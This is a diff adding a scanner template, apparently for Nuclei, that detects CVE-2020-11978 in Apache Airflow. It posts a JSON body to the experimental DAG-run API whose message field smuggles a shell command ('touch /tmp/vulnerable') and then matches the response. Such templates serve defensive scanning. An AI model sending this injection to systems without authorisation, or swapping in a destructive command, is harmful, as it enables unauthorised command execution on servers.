@@ -1,0 +1,21 @@
+id: CVE-2020-11978
+info:
+  name: Apache Airflow < 1.10.10 - Command Injection in Example DAG
+  author: cyber-squadd
+  severity: critical
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/experimental/dags/example_trigger_target_dag/dag_runs"
+    body: '{"conf": {"message": "\"; touch /tmp/vulnerable; #"}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "message"
+          - "execution_date"
+      - type: status
+        status:
+          - 200
